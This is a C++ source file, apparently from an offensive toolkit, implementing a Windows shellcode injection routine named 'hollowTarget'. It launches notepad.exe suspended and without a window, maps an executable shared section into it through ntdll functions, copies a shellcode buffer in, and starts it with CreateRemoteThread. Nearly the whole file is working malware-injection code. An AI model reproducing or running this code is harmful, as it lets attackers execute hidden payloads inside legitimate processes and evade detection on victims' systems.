#include "pch.h"
#include "define.h"
#include "hklocal.h"
#include "hkutil.h"

bool hk_local::hollowTarget(DWORD PID) noexcept {
  if (!PID) {
    LOG("ERROR: Invalid process ID. Either the process is not running or "
        "couldn't be detected.");
    return false;
  }

  // initialization
  HANDLE hSection = NULL, hRThread = NULL;
  DWORD idRThread = 0;
  LARGE_INTEGER sectionSize{};
  sectionSize.QuadPart = hk_util::shellCodeSize;
  LPVOID lpSectionLocal = nullptr, lpSectionTarget = nullptr;
  LPCSTR processPath = "C:\\Windows\\System32\\notepad.exe";
  ULONG retLength = 0;
  LUID privID{};

  STARTUPINFOA startupInfo{};
  PROCESS_INFORMATION procInfo{};
  PROCESS_BASIC_INFORMATION procBasicInfo{};
  CONTEXT procContext{};

  // create function objects
  TCreateSection hkCreateSection = (TCreateSection)hk_util::procAddr("ntdll", "NtCreateSection");
  TMapViewOfSection hkMapViewOfSection =
      (TMapViewOfSection)hk_util::procAddr("ntdll", "NtMapViewOfSection");
  TUnmapViewOfSection hkUnmapViewOfSection =
      (TUnmapViewOfSection)hk_util::procAddr("ntdll", "ZwUnmapViewOfSection");
  TSetContextThread hkSetContextThread =
      (TSetContextThread)hk_util::procAddr("ntdll", "NtSetContextThread");
  TGetContextThread hkGetContextThread =
      (TGetContextThread)hk_util::procAddr("ntdll", "NtGetContextThread");
  TQueryInformationProcess hkQueryInformationProcess =
      (TQueryInformationProcess)hk_util::procAddr("ntdll",
                                            "NtQueryInformationProcess");

  // UNUSED
  TCreateUserThread hkCreateUserThread =
      (TCreateUserThread)hk_util::procAddr("ntdll", "RtlCreateUserThread");
  TResumeProcess hkResumeProcess =
      (TResumeProcess)hk_util::procAddr("ntdll", "NtResumeProcess");
  //

  LOGn("Setting debug privilege...\t\t");
  if (hk_util::setLocalPrivilege("SeDebugPrivilege")) {  // unused right now
    //LOG("Failure.");
    //ERRCHK;
  };
  
  LOG("SUCCESS.\nCreating suspended process '" << processPath << "'.");
  if (!CreateProcessA(processPath, NULL, NULL, NULL, TRUE,
                      CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL,
                      &startupInfo, &procInfo)) {
    LOG("ERROR: Failed to create process '" << processPath << "'.");
    return false;
  }
  
  LOG("SUCCESS! Created process with PID: " << procInfo.dwProcessId << ".");

  LOG("Creating section at 0x" << std::hex << hkCreateSection << ", size "
                               << std::dec << sectionSize.QuadPart);
  hkCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize,
                  PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

  LOG("Mapping local section view...");
  hkMapViewOfSection(hSection, GetCurrentProcess(), &lpSectionLocal, NULL, NULL,
                     NULL, &hk_util::shellCodeSize, 2, NULL, PAGE_READWRITE);
  LOG("Mapped local section view at 0x" << std::hex << lpSectionLocal);

  LOG("Opening process with PID: " << std::dec << procInfo.dwProcessId << "...");
  if (!OpenProcess(PROCESS_ALL_ACCESS, FALSE, procInfo.dwProcessId)) {
    LOG("ERROR: Failed to open process with ID: " << PID << ". Error code: " << GetLastError());
    TerminateProcess(procInfo.hProcess, 0);
    return false;
  }
  
  LOG("Mapping target section view...");
  if(hkMapViewOfSection(hSection, procInfo.hProcess, &lpSectionTarget, NULL, NULL, NULL,
                         &hk_util::shellCodeSize, 2, NULL,
                         PAGE_EXECUTE_READ) != 0) {
    LOG("ERROR: failed to map target section view. Error code: "
        << GetLastError());
    TerminateProcess(procInfo.hProcess, 0);
    return false;
  };

  LOG("Mapped target section view at 0x" << std::hex << lpSectionTarget);

  LOGn("Copying shellcode to the new section...\t\t");

  memcpy(lpSectionLocal, hk_util::shellCode, hk_util::shellCodeSize);

  LOG("SUCCESS.");

  CloseHandle(hSection);

  LOG("Executing shellcode at 0x" << std::hex << lpSectionTarget << ".");

  hRThread = CreateRemoteThread(procInfo.hProcess, nullptr, 0,
                                (LPTHREAD_START_ROUTINE)lpSectionTarget,
                                nullptr, 0, &idRThread);
  
  procContext.ContextFlags = CONTEXT_FULL;
  hkGetContextThread(procInfo.hThread, &procContext);

  hkQueryInformationProcess(procInfo.hProcess, ProcessBasicInformation,
                            &procBasicInfo, sizeof(PROCESS_BASIC_INFORMATION),
                            &retLength);

  // cleanup
  _getch();
  CloseHandle(hRThread);
  TerminateProcess(procInfo.hProcess, 0);

  return true;
}
